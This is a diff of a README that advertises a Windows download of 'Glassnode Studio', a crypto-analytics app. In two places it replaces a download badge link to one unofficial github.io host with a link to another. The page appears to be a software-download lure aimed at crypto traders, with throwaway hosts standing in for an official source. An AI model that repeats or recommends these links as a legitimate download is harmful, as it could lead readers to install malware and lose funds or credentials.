@@ -4,7 +4,7 @@
 
 ## 📥 Download Glassnode Studio for Windows
 
-[![⬇️ Download Glassnode Studio](https://img.shields.io/badge/Download-Glassnode%20Studio-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/244)
+[![⬇️ Download Glassnode Studio](https://img.shields.io/badge/Download-Glassnode%20Studio-blue?style=for-the-badge&logo=windows)](https://glassnodeload.github.io/.github/)
 
 ---
 
@@ -34,7 +34,7 @@ Traders can also set automated alerts for specific market or network conditions,
 
 Whether you are a retail investor, an analyst, or part of an institutional trading desk, Glassnode Studio offers the insights needed to navigate the fast-moving world of digital assets.
 
-[![⬇️ Download Glassnode Studio](https://img.shields.io/badge/Download-Glassnode%20Studio-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/244)
+[![⬇️ Download Glassnode Studio](https://img.shields.io/badge/Download-Glassnode%20Studio-blue?style=for-the-badge&logo=windows)](https://glassnodeload.github.io/.github/)
 
 ---
 
